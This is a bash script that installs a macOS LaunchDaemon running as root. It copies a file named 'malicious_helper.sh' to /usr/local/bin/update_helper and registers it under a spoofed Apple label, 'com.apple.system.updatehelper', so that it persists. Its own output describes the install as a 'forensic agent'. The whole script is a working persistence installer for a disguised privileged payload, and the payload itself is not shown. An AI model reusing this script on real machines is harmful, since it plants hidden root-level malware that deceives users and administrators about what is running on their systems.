#!/usr/bin/env bash
set -e
LABEL="com.apple.system.updatehelper"
PLIST_SRC="./${LABEL}.plist"
HELPER_SRC="./malicious_helper.sh"
DEST_PLIST="/Library/LaunchDaemons/${LABEL}.plist"
DEST_HELPER="/usr/local/bin/update_helper"
echo "[-] Installing forensic agent..."
[[ ! -f "$PLIST_SRC" ]] && echo "[!] Run generate_agent.sh first." && exit 1
sudo cp "$HELPER_SRC" "$DEST_HELPER" && sudo chown root:wheel "$DEST_HELPER" && sudo chmod +x "$DEST_HELPER"
sudo cp "$PLIST_SRC" "$DEST_PLIST" && sudo chown root:wheel "$DEST_PLIST" && sudo chmod 644 "$DEST_PLIST"
sudo launchctl bootout system/"${LABEL}" 2>/dev/null || true
sudo launchctl bootstrap system "$DEST_PLIST"
echo "[+] Deployment successful. Logs: /tmp/${LABEL}.out"
